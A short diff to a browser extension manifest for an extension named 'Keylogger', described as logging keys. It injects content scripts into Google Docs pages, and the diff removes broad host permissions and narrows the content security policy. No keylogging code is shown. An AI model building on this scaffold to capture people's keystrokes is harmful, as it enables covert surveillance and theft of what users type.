@@ -2,11 +2,6 @@
     "name":"Keylogger",
     "version":"1.0",
     "description":"logs keys",
-    "permissions": [
-        "https://*/*",
-        "http://*/*",
-        "activeTab"
-    ],
     "content_scripts": [
       {
         "matches": ["https://docs.google.com/*"],
@@ -16,7 +11,7 @@
     "browser_action": {
       "default_popup": "popup.html"
     },
-    "content_security_policy": "script-src 'self' 'unsafe-eval' https://ajax.googleapis.com; object-src 'self'",
+    "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
     "manifest_version":2
 
 }
